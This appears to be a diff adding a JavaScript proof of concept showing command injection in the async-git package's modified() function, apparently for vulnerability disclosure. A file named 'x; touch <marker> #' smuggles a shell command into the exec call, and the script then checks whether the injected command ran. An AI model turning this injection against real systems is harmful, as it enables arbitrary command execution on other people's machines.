@@ -1,0 +1,31 @@
+```javascript
+const fs = require('fs');
+const git = require('async-git');
+
+// async-git's `modified()` passes its `path` argument straight into
+// async-execute's `exec()`, which calls Node's child_process.exec()
+// (a shell: `git log -1 --format="%at" -- ${path}`) with no escaping.
+// A path containing shell metacharacters breaks out of the intended
+// command and injects arbitrary commands.
+
+const marker = 'pwned_marker_' + Date.now();
+const maliciousPath = `x; touch ${marker} #`;
+
+// exist() (called before exec) just checks the literal path exists,
+// so we create a real file with the malicious name to pass that check.
+fs.writeFileSync(maliciousPath, 'poc');
+
+git.modified(maliciousPath)
+  .catch(() => {})
+  .then(() => {
+    setTimeout(() => {
+      if (fs.existsSync(marker)) {
+        console.log('VULNERABLE: command injection executed, created:', marker);
+        fs.unlinkSync(marker);
+      } else {
+        console.log('not vulnerable');
+      }
+      fs.unlinkSync(maliciousPath);
+    }, 300);
+  });
+```
